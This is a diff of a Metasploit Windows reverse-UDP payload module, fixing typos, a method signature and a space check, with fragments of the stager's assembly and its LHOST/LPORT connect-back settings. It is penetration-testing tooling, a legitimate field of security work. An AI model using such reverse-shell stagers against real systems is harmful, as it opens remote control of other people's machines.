@@ -1,9 +1,5 @@
 # -*- coding: binary -*-
 
-require 'msf/core'
-require 'msf/core/payload/transport_config'
-require 'msf/core/payload/windows/reverse_tcp'
-
 module Msf
 
 ###
@@ -20,7 +16,7 @@ module Payload::Windows::ReverseUdp
   #
   # Generate the first stage
   #
-  def generate
+  def generate(_opts = {})
     conf = {
       port:        datastore['LPORT'],
       host:        datastore['LHOST'],
@@ -29,7 +25,7 @@ module Payload::Windows::ReverseUdp
     }
 
     # Generate the advanced stager if we have space
-    unless self.available_space.nil? || required_space > self.available_space
+    if self.available_space && cached_size && required_space <= self.available_space
       conf[:exitfunk] = datastore['EXITFUNC']
       conf[:reliable] = true
     end
@@ -84,7 +80,7 @@ module Payload::Windows::ReverseUdp
 
         mov eax, 0x0190         ; EAX = sizeof( struct WSAData )
         sub esp, eax            ; alloc some space for the WSAData structure
-        push esp                ; push a pointer to this stuct
+        push esp                ; push a pointer to this struct
         push eax                ; push the wVersionRequested parameter
         push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSAStartup')}
         call ebp                ; WSAStartup( 0x0190, &WSAData );
@@ -139,7 +135,7 @@ module Payload::Windows::ReverseUdp
     end
 
     asm << %Q^
-      ; this  lable is required so that reconnect attempts include
+      ; this label is required so that reconnect attempts include
       ; the UUID stuff if required.
       connected:
     ^
